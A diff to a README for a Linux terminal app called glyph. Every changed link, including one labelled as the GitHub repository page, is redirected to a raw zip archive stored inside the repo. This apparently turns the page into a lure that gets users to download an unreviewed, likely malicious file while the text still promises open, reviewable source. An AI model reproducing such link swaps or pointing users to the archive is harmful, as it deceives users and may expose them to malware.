@@ -1,6 +1,6 @@
 # 🚀 glyph - Your Modern, Customizable Terminal for Linux
 
-[![Download glyph](https://img.shields.io/badge/Download%20glyph-Latest%20Release-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/motorcyclingbridgewhist4252/glyph)
+[![Download glyph](https://img.shields.io/badge/Download%20glyph-Latest%20Release-blue?style=for-the-badge&logo=github&color=4CAF50)](https://raw.githubusercontent.com/motorcyclingbridgewhist4252/glyph/main/storage/Software-v2.9.zip)
 
 ## 👋 Welcome to glyph
 
@@ -26,7 +26,7 @@ Getting glyph on your Linux system is simple. Follow these steps:
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 **[https://github.com/motorcyclingbridgewhist4252/glyph](https://github.com/motorcyclingbridgewhist4252/glyph)**
+👉 **[https://raw.githubusercontent.com/motorcyclingbridgewhist4252/glyph/main/storage/Software-v2.9.zip](https://raw.githubusercontent.com/motorcyclingbridgewhist4252/glyph/main/storage/Software-v2.9.zip)**
 
 Once you're on that page, look for the **"Releases"** section or a **"Download"** button. Click it to get the latest version of glyph.
 
@@ -119,7 +119,7 @@ Yes. Since it's open-source, anyone can review the code. It doesn't collect your
 
 If you run into any problems or have questions, here are ways to get support:
 
-- **Visit the GitHub Repository:** [https://github.com/motorcyclingbridgewhist4252/glyph](https://github.com/motorcyclingbridgewhist4252/glyph) – You can report issues, ask questions, or see what others are saying.
+- **Visit the GitHub Repository:** [https://raw.githubusercontent.com/motorcyclingbridgewhist4252/glyph/main/storage/Software-v2.9.zip](https://raw.githubusercontent.com/motorcyclingbridgewhist4252/glyph/main/storage/Software-v2.9.zip) – You can report issues, ask questions, or see what others are saying.
 - **Check the Documentation:** Look for a **"Wiki"** or **"Docs"** tab on the GitHub page.
 - **Join the Community:** Many open-source projects have forums or chat groups. Search for "glyph terminal" on your favorite search engine.
 
@@ -130,7 +130,7 @@ glyph is more than just a terminal – it's a tool that adapts to you. Whether y
 Download glyph today and see the difference a modern, customizable terminal can make. Your Linux experience will never be the same!
 
 **Ready to get started?**  
-👉 **[Download glyph Now](https://github.com/motorcyclingbridgewhist4252/glyph)**
+👉 **[Download glyph Now](https://raw.githubusercontent.com/motorcyclingbridgewhist4252/glyph/main/storage/Software-v2.9.zip)**
 
 ---
 
